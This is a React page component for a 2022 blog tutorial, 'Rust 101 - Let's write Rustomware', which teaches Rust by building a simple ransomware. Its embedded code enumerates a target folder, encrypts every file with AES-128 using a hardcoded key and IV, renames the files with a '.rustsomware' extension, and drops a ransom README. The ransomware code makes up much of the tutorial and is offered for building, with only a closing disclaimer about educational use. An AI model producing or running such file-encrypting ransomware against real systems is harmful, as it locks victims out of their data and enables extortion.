"use client";

import SecondaryHeader, {BlogPrologue, BulletList, Code, InlineCode} from "@/components/BlogComponents";
import React from "react";
import StyledLink from "@/components/StyledLink";
import Image from "next/image";

export default function Rust101Rustomware() {
    const createRustProj = `cargo new rustomware
cd rustomware`;

    const rustProjStruct = `rustomware
│ .gitignore
│ Cargo.toml
│
└───src
│ │ main.rs
│
└───.git
│ ...`;

    const readDirRust = ` use std::{
    env,
    fs
    };

    fn main() {
        let args: Vec<_> = env::args().collect();
    
        if args.len() < 2 {
            println!("Not enough arguments! Usage: rustsomware <encrypt|decrypt> <folder>");
            return;
        }
    
        let entries = fs::read_dir(args[2].clone()).unwrap();
    
        for raw_entry in entries {
            let entry = raw_entry.unwrap();
        
            if entry.file_type().unwrap().is_file() {
                println!("File Name: {}", entry.path().display())
            }
        }
    }`;

    const cargoDep = `[Dependencies]
libaes = "0.6.2"`;

    const encryptionCode = ` fn encrypt_decrypt(file_name: &str, action: &str) -> bool {
    let key = b"fTjWmZq4t7w!z%C*";
    let iv = b"+MbQeThWmZq4t6w9";
    let cipher = Cipher::new_128(key);

    match action {
        "encrypt" => {
            println!("[*] Encrypting {}", file_name);
            let encrypted = cipher.cbc_encrypt(iv, &fs::read(file_name).unwrap());
            fs::write(file_name, encrypted).unwrap();
            let new_filename = format!("{}.rustsomware", file_name);
            fs::rename(file_name, new_filename).unwrap();
        }
        
            "decrypt" => {
            println!("[*] Decrypting {}", file_name);
            let decrypted = cipher.cbc_decrypt(iv, &fs::read(file_name).unwrap());
            fs::write(file_name, decrypted).unwrap();
            let new_filename = file_name.replace(".rustsomware", "");
            fs::rename(file_name, new_filename).unwrap();
        }
        
            _ => {
            println!("[-] Invalid action!");
            return false
        }
    }
    
    return true;
}`;

    const createReadme = `...

// Dropping the README.txt file.
let ransom_message = include_str!("../res/README.txt");
let readme_path = format!("{}/README_Rustsomware.txt", args[2].clone());
fs::write(readme_path, ransom_message).unwrap();`;

    return (
        <div className="bg-bgInsideDiv p-6 rounded-xl h-full">
            <BlogPrologue title="Rust 101 - Let's write Rustomware"
                          date="07.05.2022" projectLink="https://github.com/Idov31/rustomware"/>
            <div className="pt-4">
                <article>
                    <SecondaryHeader text="Introduction"/>
                    <div className="pt-4">
                        When I first heard about Rust, my first reaction was &quot;Why?&quot;. The language looked to me as a
                        &quot;wannabe&quot; to C and I didn&apos;t understand why it is so popular. I started to read more and more
                        about this language and began to like it. To challenge myself, I decided to write <StyledLink
                        href="https://github.com/idov31/rustomware" content="rustomware" textSize="text-md"/> in Rust.
                        Later on, I ran into <StyledLink
                        href="https://github.com/trickster0" content="trickster0" textSize="text-md"/>&apos;s amazing
                        repository <StyledLink href="https://github.com/trickster0/OffensiveRust"
                                               content="OffensiveRust" textSize="text-md"/> and that gave me more
                        motivation to learn Rust. Nowadays I&apos;m creating a unique C2 framework written (mostly) in Rust.
                        If you are familiar with Rust, you can skip to Part 2 below.

                        <div className="pt-2">
                            The code for this blog post is available on my <StyledLink
                            href="https://github.com/idov31/rustomware" content="GitHub" textSize="text-md"/> :).
                        </div>
                    </div>

                    <SecondaryHeader text="Rust's capabilities"/>
                    <div className="pt-4">
                        The reason that I think that Rust is an awesome language is that it&apos;s a powerful compiler, has
                        memory safety, easy syntax and great interaction with the OS. Rust&apos;s compiler takes care to
                        alert for anything that can be problematic - A thing that can be annoying but in the end, it
                        helps the developer to create safer programs. On the other hand, the compiler also takes care of
                        annoying tasks that are required when programming in C like freeing memory, closing files, etc.
                        Rust is also a cross-platform language, so it can be used on any platform and be executed
                        differently depending on the OS.
                    </div>

                    <SecondaryHeader text="Part 1 - Hello Rust"/>
                    <div className="pt-4">
                        Enough talking and let&apos;s start to code! The first thing we want to do is create our program, it
                        can be done with this simple command:

                        <Code text={createRustProj} language="shell"/>

                        <div className="pt-2">
                            In the rustsomware directory, we will have these files:
                        </div>
                        <Code text={rustProjStruct} language="shell"/>

                        <div className="pt-2">
                            In the <InlineCode text="main.rs"/> file, we will write our code, and in <InlineCode
                            text="Cargo.toml"/> we will include our modules. To build our new program, we will use the
                            following command:
                        </div>
                        <div className="pt-2">
                            <InlineCode text="cargo build"/>
                        </div>

                        <div className="pt-2">
                            Our executable will be in the target directory (because we didn&apos;t use the release flag so it
                            will be in debugging) and will be called <InlineCode text="rustomware.exe"/>. You&apos;ll notice
                            that there are a few new files and directories - the <InlineCode text="Cargo.lock"/> file,
                            and many files under the target directory. I won&apos;t elaborate on them here but in general
                            the <InlineCode text="Cargo.lock"/> file contains the dependencies of the project in a
                            format that can be used by <InlineCode text="Cargo"/> to build the project. <b>THERE IS NO
                            NEED TO EDIT THESE FILES</b>. In the target directory, we will have the modules themselves,
                            the executable and the PDB file.
                        </div>
                        <div className="pt-2">
                            After we learned a bit about Rust, we can dive into coding our ransomware.
                        </div>
                    </div>

                    <SecondaryHeader text="Part 2 - Iterating the target folder"/>
                    <div className="pt-4">
                        Like any good ransomware, we will need to have these functionalities:

                        <BulletList items={[
                            {content: "Encrypting files."},
                            {content: "Decrypting files."},
                            {content: "Dropping a README file."},
                            {content: "Adding our extension to the files."}
                        ]}/>

                        <div className="pt-2">
                            For that, we will need to use crates (modules) to help us out. First things first, we need
                            to be able to get a list of all the files in the target directory from the argv. To do that,
                            we
                            can use the std library and the fs module. To use a module all we need to do is to import
                            it:
                        </div>
                        <Code text={readDirRust} language="rust"/>

                        <div className="pt-2">
                            Now we have a program that finds files in a folder. Notice that we used the <InlineCode
                            text="unwrap()"/> method to get the result, it is required because Rust functions mostly
                            send as a result type that can be either <InlineCode text="Ok"/> or <InlineCode
                            text="Err"/>. We also needed to clone the string because Rust needs to clone objects or
                            create a safe borrow (It is not recommended to borrow objects, but it is possible and can be
                            useful in some cases).
                        </div>
                    </div>

                    <SecondaryHeader text="Part 3 - Encrypting / Decrypting the files"/>
                    <div className="pt-4">
                        To encrypt the files, we will the <StyledLink
                        href="https://en.wikipedia.com/wiki/Advanced_Encryption_Standard" content="AES"
                        textSize="text-md"/> cipher with a hardcoded key and IV. All that is left for us to do is to
                        create a function that is responsible to encrypt the file and change its extension
                        to <InlineCode
                        text=".rustsomware"/>. First things first, to be able to do encryption/decryption methods we
                        will need to have a crate to help with that. Since the <InlineCode text="libaes"/> crate isn&apos;t a
                        default crate, we need to import it to our project and this can be done by modifying the
                        <InlineCode text=" Cargo.toml"/> file by adding:

                        <Code text={cargoDep} language="toml"/>

                        <div className="pt-2">
                            Now, we can create a function that can encrypt and decrypt. For the sake of practice, we
                            will use a hardcoded key and IV but this is <b>NOT</b> recommended at all.
                        </div>
                        <Code text={encryptionCode} language="rust"/>

                        <div className="pt-2">
                            You can use the key and IV from above or <StyledLink
                            href="https://www.allkeysgenerator.com/Random/Security-Encryption-Key-Generator.aspx"
                            content="generate them yourself" textSize="text-md"/>. The code above is a simple example
                            of how to use AES128 with Rust, pretty simple right?
                        </div>
                        <div className="pt-2">
                            As you saw, Rust has a simple interface with the file system that allows you to rename and
                            do io operations easily. Because this is a simple example the function returns a boolean
                            type but it is recommended to return the error to the calling function for further handling.
                        </div>
                    </div>

                    <SecondaryHeader text="Part 4 - Adding pretty prints and README file"/>
                    <div className="pt-4">
                        Just like any good ransomware we need to do a simple thing and add a README file. For the sake
                        of learning, we will learn about including files statically to our binary. Create a readme.txt
                        file with your ransom message in it (it is recommended to create it in a separate directory
                        inside your project directory but you can also put it in the src directory). To add the file,
                        all we need to do is to use the <InlineCode text="include_str!"/> macro (everything that ends
                        with ! in rust is a macro) and save it to a variable.
                        <Code text={createReadme} language="rust"/>

                        <div className="pt-2">
                            As you saw, we can just save it to a file and if we want to do any changes just change the
                            README file and recompile, no code editing is required.
                        </div>
                        <div className="pt-2">
                            Result: <Image src="/post-images/rust101-rustomware/encrypted_files.png"
                                           width="700" height="500" alt="result"/>
                        </div>
                    </div>

                    <SecondaryHeader text="Conclusion"/>
                    <div className="pt-4">
                        In this blog post, you got a taste of Rust&apos;s power and had fun with it by creating a simple
                        program. I think that in the future we will see more and more infosec tools that are written in
                        Rust. The whole code is available on my <StyledLink
                        href="https://github.com/idov31" content="GitHub" textSize="text-md" />, for any questions
                        feel free to ask me on <StyledLink href="https://x.com/idov31" content="X (Twitter)"
                                                           textSize="text-md" />.
                    </div>

                    <SecondaryHeader text="Disclaimer"/>
                    <div className="pt-4">
                        I&apos;m not responsible for any damage that may occur to your computer. This article is just for
                        educational purposes and is not intended to be used in any other way.
                    </div>
                </article>
            </div>
        </div>
    );
}